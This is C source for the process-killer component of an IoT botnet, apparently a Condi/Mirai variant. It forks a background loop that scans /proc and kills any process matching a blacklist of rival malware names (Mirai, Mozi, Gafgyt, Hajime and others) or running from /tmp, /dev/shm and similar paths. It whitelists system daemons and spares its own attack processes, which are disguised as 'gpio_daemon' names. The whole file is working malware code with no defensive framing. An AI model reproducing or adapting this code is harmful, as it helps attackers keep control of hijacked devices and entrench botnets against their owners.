#define _GNU_SOURCE

#include <stddef.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

#define BUFFER 1024
#define COMM_BUFFER_SIZE 256

/* Forward declarations */
bool is_attack_process(pid_t pid);
bool is_whitelisted(const char *path);
void killer_exe(void);
void killer_maps(void);
bool killer_kill_by_name(const char *name);

/* Global killer process ID and stop flag */
int killer_pid = 0;
volatile int stop_flag = 0;

/* Whitelist and blacklist arrays (unchanged) */
const char *whitelisted[] = {
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "media/",
    "srv/",
    "sbin/",
    "lib/",
    "etc/",
    "telnet",
    "ssh",
    "watchdog",
    "sshd",
    "/usr/compress/bin/",
    "/compress/bin",
    "/compress/usr/",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/",
    "systemd",
    "udevd",
    "dbus-daemon",
    "syslogd",
    "rsyslog",
    "cron",
    "atd",
    "networkd",
    "ntpd",
    "chronyd",
    "rpcbind",
    "apache2",
    "nginx",
    "mysql",
    "mariadb",
    "postgresql",
    "docker",
    "geoserver",
    "tomcat",
    "jetty",
    "geowebcache",
    "mapproxy",
    "geonetwork"
};

const char *blacklisted[] = {
    "/tmp",
    "/var/tmp",
    "/dev/shm",
    "/var/run",
    "/dev/.udev",
    "/mnt",
    "/root",
    "/run",
    "/var",
    "/boot",
    "/home",
    "/dev",
    "/.",
    "./",
    "(deleted)",
    "WTF",
    "var/run/",
    "boatnet",
    "botnet",
    "main_x86",
    "main_x86_64",
    "main_mips",
    "main_mipsel",
    "main_arm",
    "main_arm5",
    "main_arm6",
    "main_arm7",
    "main_ppc",
    "main_m68k",
    "main_sh4",
    "main_spc",
    "ohshit",
    "mirai",
    "mozi",
    "qbot",
    "kaiten",
    "dlr.armv4l",
    "dlr.armv5l",
    "dlr.armv6l",
    "dlr.armv7l",
    "dlr.i486",
    "dlr.i586",
    "dlr.i686",
    "dlr.m68k",
    "dlr.mips",
    "dlr.mipsel",
    "dlr.powerpc",
    "dlr.sh4",
    "dlr.sparc",
    "dlr.x86_64",
    "dlr.x86",
    "dvrHelper",
    "dvrhelper",
    "hajime",
    "satori",
    "gafgyt",
    "bashlite",
    "kaiji",
    "init/cmd"
};

/* Returns true if `path` contains any whitelist substring */
bool is_whitelisted(const char *path) {
    for (size_t i = 0; i < sizeof(whitelisted)/sizeof(*whitelisted); i++) {
        if (strstr(path, whitelisted[i])) {
            return true;
        }
    }
    return false;
}

/* Detect your own “attack” threads so you don’t kill them */
bool is_attack_process(pid_t pid) {
    char path[64], comm[COMM_BUFFER_SIZE] = {0};
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f) return false;

    if (!fgets(comm, sizeof(comm), f)) {
        fclose(f);
        return false;
    }
    fclose(f);
    comm[strcspn(comm, "\n")] = 0;

    return (strcmp(comm, "gpioc_daemon") == 0 ||
            strcmp(comm, "gpiol_daemon") == 0 ||
            strcmp(comm, "gpio_daemon") == 0);
}

/* Scan /proc for executables matching blacklist only */
void killer_exe(void) {
    DIR *dir = opendir("/proc/");
    if (!dir) {
        perror("opendir");
        return;
    }

    pid_t self = getpid(), parent = getppid();
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        int pid = atoi(entry->d_name);
        if (pid <= 1 || pid == self || pid == killer_pid || pid == parent)
            continue;
        if (is_attack_process(pid))
            continue;

        char exe_path[BUFFER], real_path[BUFFER];
        snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
        ssize_t len = readlink(exe_path, real_path, sizeof(real_path)-1);
        if (len <= 0) continue;
        real_path[len] = '\0';

        /* 1) Skip safe system/whitelisted binaries */
        if (is_whitelisted(real_path))
            continue;

        /* 2) Kill if any blacklist substring matches */
        for (size_t i = 0; i < sizeof(blacklisted)/sizeof(*blacklisted); i++) {
            if (strstr(real_path, blacklisted[i])) {
                kill(pid, SIGKILL);
#ifdef DEBUG
                printf("(condi/exe) Killed process: %s, PID: %d\n",
                       real_path, pid);
#endif
                break;
            }
        }
    }

    closedir(dir);
}

/* Scan /proc/[pid]/maps for any disallowed mappings */
void killer_maps(void) {
    DIR *dir = opendir("/proc/");
    if (!dir) return;

    pid_t parent = getppid();
    struct dirent *file;
    while ((file = readdir(dir)) != NULL) {
        int pid = atoi(file->d_name);
        if (pid <= 1 || pid == killer_pid || pid == parent)
            continue;

        char maps_path[BUFFER];
        snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
        FILE *maps = fopen(maps_path, "r");
        if (!maps) continue;

        char line[BUFFER];
        bool killed = false;
        while (fgets(line, sizeof(line), maps) && !killed) {
            char token[BUFFER];
            if (sscanf(line, "%s", token) != 1) continue;
            if (is_whitelisted(token)) continue;
            for (size_t i = 0; i < sizeof(blacklisted)/sizeof(*blacklisted); i++) {
                if (strstr(token, blacklisted[i])) {
                    kill(pid, SIGKILL);
#ifdef DEBUG
                    printf("(condi/maps) Killed process: %s, PID: %d\n",
                           token, pid);
#endif
                    killed = true;
                    break;
                }
            }
        }
        fclose(maps);
    }

    closedir(dir);
}

/* Kill by process name prefix */
bool killer_kill_by_name(const char *name) {
    if (!name || !*name) return false;
    DIR *dir = opendir("/proc/");
    if (!dir) return false;

    pid_t self = getpid(), parent = getppid();
    bool any = false;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        int pid = atoi(entry->d_name);
        if (pid <= 1 || pid == self || pid == killer_pid || pid == parent)
            continue;
        if (is_attack_process(pid) && strcmp(name, "gpioc_daemon") &&
            strcmp(name, "gpiol_daemon") && strcmp(name, "gpio_daemon"))
            continue;

        char comm_path[64], comm[COMM_BUFFER_SIZE] = {0};
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *f = fopen(comm_path, "r");
        if (!f) continue;
        if (!fgets(comm, sizeof(comm), f)) {
            fclose(f);
            continue;
        }
        fclose(f);
        comm[strcspn(comm, "\n")] = 0;

        if (strncmp(comm, name, strlen(name)) == 0) {
            kill(pid, SIGKILL);
#ifdef DEBUG
            printf("(condi/kill_by_name) Killed process: %s, PID: %d\n",
                   comm, pid);
#endif
            any = true;
        }
    }
    closedir(dir);
    return any;
}

void killer_kill(void) {
    stop_flag = 1;
}

void killer_init(void) {
    int child = fork();
    if (child < 0) return;
    if (child > 0) {
        killer_pid = child;
        return;
    }

    killer_pid = getpid();
    signal(SIGHUP, SIG_IGN);
    sleep(5);

    while (!stop_flag) {
        killer_exe();
        killer_maps();
        usleep(300000);
    }

    exit(0);
}
